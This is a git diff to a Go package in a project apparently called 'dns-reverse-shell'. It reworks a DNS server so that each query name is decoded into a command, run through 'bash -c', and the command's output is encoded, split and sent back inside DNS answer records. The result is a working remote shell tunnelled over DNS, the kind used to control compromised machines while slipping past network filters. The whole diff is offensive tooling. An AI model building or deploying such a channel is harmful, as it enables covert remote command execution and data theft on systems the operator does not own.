@@ -1,10 +1,9 @@
 package protocol
 
 import (
-	"dns-shellcode/main/encoder"
+	"dns-reverse-shell/main/encoder"
 	"fmt"
 	"github.com/miekg/dns"
-	"os"
 	"os/exec"
 )
 
@@ -17,14 +16,16 @@ func newDnsHandler(s *DNSServer) *dnsHandler {
 }
 
 type DNSServer struct {
-	port    string
-	encoder encoder.StringEncoder
-	handler *dnsHandler
+	port            string
+	encoder         encoder.StringEncoder
+	handler         *dnsHandler
+	messageSplitter MessageSplitter
 }
 
 func NewDnsServer(port string, encoder encoder.StringEncoder) *DNSServer {
 	d := &DNSServer{port: port, encoder: encoder}
 	d.handler = newDnsHandler(d)
+	d.messageSplitter = NewSimpleMessageSplitter()
 	return d
 }
 
@@ -55,13 +56,12 @@ func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 
 	for _, question := range r.Question {
 		command := h.server.encoder.Decode(question.Name)
-		fmt.Printf("Received command: %s\n", command)
-		output := getCommandOutput(executeCommand(command))
-		fmt.Printf("Result: %s", output)
-		//todo send output instead of test: use msg splitter here
-		encoded := h.server.encoder.Encode("TEST")
-		rr, _ := dns.NewRR(encoded + " 3600 IN MX 10 example.com")
-		msg.Answer = append(msg.Answer, rr)
+		output := executeCommand(command)
+		encoded := h.server.encoder.Encode(output)
+		splitMessage := h.server.messageSplitter.Split(encoded)
+		for i := range splitMessage {
+			msg.Answer = append(msg.Answer, splitMessage[i])
+		}
 	}
 	err := w.WriteMsg(msg)
 	if err != nil {
@@ -70,16 +70,12 @@ func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 	}
 }
 
-func executeCommand(command string) *exec.Cmd {
+func executeCommand(command string) string {
 	cmd := exec.Command("bash", "-c", command)
-	cmd.Stdin = os.Stdin
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-	_ = cmd.Run()
-	return cmd
-}
-
-func getCommandOutput(cmd *exec.Cmd) string {
-	output, _ := cmd.Output()
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		fmt.Println(err)
+		return "command execution failed: " + err.Error()
+	}
 	return string(output)
 }
